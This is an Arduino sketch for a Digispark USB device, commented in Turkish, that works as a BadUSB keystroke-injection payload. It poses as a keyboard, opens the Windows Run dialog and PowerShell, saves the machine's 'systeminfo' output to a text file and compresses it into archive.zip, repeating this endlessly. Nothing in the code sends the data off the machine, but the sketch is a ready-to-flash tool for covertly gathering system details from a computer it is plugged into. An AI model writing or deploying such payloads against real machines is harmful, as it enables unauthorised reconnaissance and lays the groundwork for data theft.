#include"DigiKeyboard.h"
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:

DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(100);

DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
DigiKeyboard.delay(5000);

DigiKeyboard.print("powershell");
DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(10000);

DigiKeyboard.print("systeminfo > ucuncu_kod.txt"); //Burada sistem bilgisini txt dosyasına yazdırıyorum
DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(3000);


DigiKeyboard.print("Compress-Archive -Path ""ucuncu_kod.txt"" -DestinationPath ""archive.zip"); //powershellde herhangi bir dosyayı bu komutla program kullanmadan sıkıştırabilirsin.
DigiKeyboard.delay(3000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(5000);

}
